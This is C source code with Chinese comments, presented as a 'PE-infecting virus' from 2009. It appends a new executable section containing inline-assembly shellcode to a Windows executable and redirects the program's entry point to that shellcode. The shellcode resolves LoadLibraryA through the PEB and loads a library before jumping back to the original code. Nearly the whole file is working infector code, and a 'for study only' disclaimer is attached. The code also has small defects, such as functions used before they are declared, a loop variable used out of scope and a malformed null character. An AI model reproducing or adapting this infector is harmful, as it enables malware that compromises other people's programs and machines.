/////////////////////////////////////////////////////////////////////////////
// 感染PE文件病毒源码
// by Koma   2009-12-18 0:30
// http://blog.csdn.net/wangningyu
// 程序仅供学习交流，请不要尝试用作非法用途！
// 感谢寂寞的狼、llydd、大飞的指导与技术支持！
/////////////////////////////////////////////////////////////////////////////
// 引入头文件
//
#include <windows.h>

// 全局函数声明
/************************************************************************/
BOOL InfectPE(CString strFilePath);				// 感染指定路径exe文件
BOOL IsInfect(CString strFile);					// 判断是否被感染过
/************************************************************************/

int main1()
{
	MessageBox(NULL, "程序启动成功！", "测试", MB_OK);
	char strFile[MAX_PATH] = "C:\\Users\\ZhangHao\\Desktop\\source.exe";
	InfectPE(strFile);
	return 0;
}
/************************************************************************/
/* 函数说明：感染exe文件
/* 参    数：strFile	文件路径
/* 返 回 值：成功返回TRUE，失败返回FALSE
/************************************************************************/
BOOL InfectPE(CString strFilePath)
{
	FILE*					rwFile;						// 被感染的文件
	IMAGE_SECTION_HEADER	NewSection;					// 定义要添加的区块
	IMAGE_NT_HEADERS		NtHeader;						// 
	DWORD					pNT;						// pNT中存放IMAGE_NT_HEADERS结构的地址
	int						nOldSectionNo;
	int						originalOEP;

	if ((rwFile = fopen(strFilePath, "rb")) == NULL) {			// 打开文件失败则返回
		return FALSE;
	}

	if (!CheckPE(rwFile)) {								// 如果不是PE文件则返回
		return FALSE;
	}

	fseek(rwFile, 0x3c, 0);
	fread(&pNT, sizeof(DWORD), 1, rwFile);
	fseek(rwFile, pNT, 0);
	fread(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, rwFile);	// 读取原文件的IMAGE_NT_HEADERS结构
	nOldSectionNo = NtHeader.FileHeader.NumberOfSections;	// 保存原文件区块数量
	originalOEP = NtHeader.OptionalHeader.AddressOfEntryPoint;		// 保存原文件区块OEP
	IMAGE_SECTION_HEADER	lastSectionHeader;						// 定义一个区块存放原文件最后一个区块的信息
	int SECTION_ALIG = NtHeader.OptionalHeader.SectionAlignment;
	int FILE_ALIG = NtHeader.OptionalHeader.FileAlignment;	// 保存文件对齐值与区块对齐值
	memset(&NewSection, 0, sizeof(IMAGE_SECTION_HEADER));
	fseek(rwFile, pNT + 248, 0);							// 读原文件最后一个区块的信息
	for (int i = 0; i<nOldSectionNo; i++)
		fread(&lastSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, rwFile);

	FILE	*newfile = fopen(strFilePath, "rb+");
	if (newfile == NULL) {
		return FALSE;
	}
	fseek(newfile, lastSectionHeader.PointerToRawData + lastSectionHeader.SizeOfRawData, SEEK_SET);
	goto shellend;
	__asm
	{
	shell:  PUSHAD
			MOV  EAX, DWORD PTR FS : [30H]; FS:[30H]指向PEB
			MOV  EAX, DWORD PTR[EAX + 0CH]; 获取PEB_LDR_DATA结构的指针
			MOV  EAX, DWORD PTR[EAX + 1CH]; 获取LDR_MODULE链表表首结点的inInitializeOrderModuleList成员的指针
			MOV  EAX, DWORD PTR[EAX]; LDR_MODULE链表第二个结点的inInitializeOrderModuleList成员的指针
			MOV  EAX, DWORD PTR[EAX];
			MOV  EAX, DWORD PTR[EAX + 08H]; inInitializeOrderModuleList偏移8h便得到Kernel32.dll的模块基址
			MOV  EBP, EAX; 将Kernel32.dll模块基址地址放至kernel中
			MOV  EAX, DWORD PTR[EAX + 3CH]; 指向IMAGE_NT_HEADERS
			MOV  EAX, DWORD PTR[EBP + EAX + 120]; 指向导出表
			MOV  ECX, [EBP + EAX + 24]; 取导出表中导出函数名字的数目
			MOV  EBX, [EBP + EAX + 32]; 取导出表中名字表的地址
			ADD  EBX, EBP
			PUSH WORD  PTR 0X00; 构造GetProcAddress字符串
			PUSH DWORD PTR 0X73736572
			PUSH DWORD PTR 0X64644163
			PUSH DWORD PTR 0X6F725074
			PUSH WORD PTR 0X6547
			MOV  EDX, ESP
			PUSH ECX

			F1 :
			MOV  EDI, EDX
				POP  ECX
				DEC  ECX
				TEST  ECX, ECX
				JZ  EXIT
				MOV  ESI, [EBX + ECX * 4]
				ADD  ESI, EBP
				PUSH  ECX
				MOV  ECX, 15
				REPZ  CMPSB
				TEST  ECX, ECX
				JNZ  F1

				POP  ECX
				MOV  ESI, [EBP + EAX + 36]; 取得导出表中序号表的地址
				ADD  ESI, EBP
				MOVZX  ESI, WORD PTR[ESI + ECX * 2]; 取得进入函数地址表的序号
				MOV  EDI, [EBP + EAX + 28]; 取得函数地址表的地址
				ADD  EDI, EBP
				MOV  EDI, [EDI + ESI * 4]; 取得GetProcAddress函数的地址
				ADD  EDI, EBP

				PUSH WORD PTR 0X00; 构造LoadLibraryA字符串
				PUSH DWORD PTR 0X41797261
				PUSH DWORD PTR 0X7262694C
				PUSH DWORD PTR 0X64616F4C
				PUSH ESP
				PUSH  EBP
				CALL  EDI; 调用GetProcAddress取得LoadLibraryA函数的地址
				PUSH  WORD PTR 0X00; 添加参数“test”符串
				PUSH  DWORD PTR 0X74736574
				PUSH  ESP
				CALL  EAX
				EXIT : ADD ESP, 36; 平衡堆栈
				POPAD
	}
shellend:
	char*	pShell;
	int		nShellLen;
	BYTE	jmp = 0xE9;
	__asm
	{
		LEA EAX, shell
		MOV pShell, EAX;
		LEA EBX, shellend
			SUB EBX, EAX
			MOV nShellLen, EBX
	}

	// 写入SHELLCODE,
	for (i = 0; i<nShellLen; i++)
		fputc(pShell[i], newfile);

	// SHELLCODE之后是跳转到原OEP的指令
	NewSection.VirtualAddress = lastSectionHeader.VirtualAddress + Align(lastSectionHeader.Misc.VirtualSize, SECTION_ALIG);
	/* 
		E9指令是段间相对转移指令,占5个字节,后面跟的是相对当前指令的下一条指令的地址的偏移量
		目标地址的计算公式为:该指令中的偏移值 + 本转移指令的下一条指令的地址
		偏移量 = 目标地址 - (转移指令所在地址 + 5)
	*/
	originalOEP = originalOEP - (NewSection.VirtualAddress + nShellLen) - 5;
	fwrite(&jmp, sizeof(jmp), 1, newfile);
	fwrite(&originalOEP, sizeof(originalOEP), 1, newfile);

	// 将最后增加的数据用0填充至按文件中对齐的大小
	for (i = 0; i<Align(nShellLen, FILE_ALIG) - nShellLen - 5; i++)
		fputc('/0', newfile);

	// 新区块中的数据
	strcpy((char*)NewSection.Name, ".NYsky");
	NewSection.PointerToRawData = lastSectionHeader.PointerToRawData + lastSectionHeader.SizeOfRawData;
	NewSection.Misc.VirtualSize = nShellLen;
	NewSection.SizeOfRawData = Align(nShellLen, FILE_ALIG);
	NewSection.Characteristics = 0xE0000020;

	// 新区块可读可写可执行、写入新的块表
	fseek(newfile, pNT + 248 + sizeof(IMAGE_SECTION_HEADER)*nOldSectionNo, 0);
	fwrite(&NewSection, sizeof(IMAGE_SECTION_HEADER), 1, newfile);

	int nNewImageSize = NtHeader.OptionalHeader.SizeOfImage + Align(nShellLen, SECTION_ALIG);
	int nNewSizeofCode = NtHeader.OptionalHeader.SizeOfCode + Align(nShellLen, FILE_ALIG);
	fseek(newfile, pNT, 0);
	NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
	NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	NtHeader.OptionalHeader.SizeOfCode = nNewSizeofCode;
	NtHeader.OptionalHeader.SizeOfImage = nNewImageSize;
	NtHeader.FileHeader.NumberOfSections = nOldSectionNo + 1;
	// 更改入口点
	NtHeader.OptionalHeader.AddressOfEntryPoint = NewSection.VirtualAddress;

	// 写入更新后的PE头结构
	fwrite(&NtHeader, sizeof(IMAGE_NT_HEADERS), 1, newfile);
	fclose(newfile);
	fclose(rwFile);
	return TRUE;
}
/************************************************************************/
/* 函数说明：用来计算对齐数据后的大小
/* 参    数：size		计算大小
/*			 align		对齐后的长度
/* 返 回 值：对齐数据后的大小
/************************************************************************/
BOOL CheckPE(FILE* pFile)
{
	fseek(pFile, 0, SEEK_SET);
	BOOL  bFlags = FALSE;
	WORD  IsMZ;
	DWORD  IsPE, pNT;
	fread(&IsMZ, sizeof(WORD), 1, pFile);
	if (IsMZ == 0x5A4D)
	{
		fseek(pFile, 0x3c, SEEK_SET);
		fread(&pNT, sizeof(DWORD), 1, pFile);
		fseek(pFile, pNT, SEEK_SET);
		fread(&IsPE, sizeof(DWORD), 1, pFile);
		if (IsPE == 0X00004550)
			bFlags = TRUE;
		else
			bFlags = FALSE;
	}
	else {
		bFlags = FALSE;
	}
	fseek(pFile, 0, SEEK_SET);
	return bFlags;
}
/************************************************************************/
/* 函数说明：用来计算对齐数据后的大小
/* 参    数：size		计算大小
/*			 align		对齐后的长度
/* 返 回 值：对齐数据后的大小
/************************************************************************/
int Align(int size, unsigned int align)
{
	if (size%align != 0)
		return (size / align + 1)*align;
	else
		return size;
}
